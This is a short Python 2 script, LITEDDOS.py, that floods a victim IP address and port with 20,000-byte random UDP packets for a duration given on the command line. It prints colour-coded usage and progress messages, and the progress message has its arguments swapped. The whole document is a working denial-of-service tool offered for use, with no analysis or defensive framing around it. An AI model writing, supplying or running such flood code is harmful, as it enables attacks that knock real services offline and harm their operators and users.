import time
import socket
import random
import sys
def usage():
    print "\033[1;94m#########################################################"
    print "    \033[1;92mCommand: python2 LITEDDOS.py <ip> <port> <packet>    "
    print "\033[1;94m#########################################################"
def flood(victim, vport, duration):
    # Create a server, when I call "SOCK_DGRAM" it shows UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 one byte representation to the server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mStarting \033[1;32m%s \033[1;91msends \033[1;32m%s \033[1;91mpackets on port \033[1;32m%s "%(sent, victim, vport)
def main():
    # print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
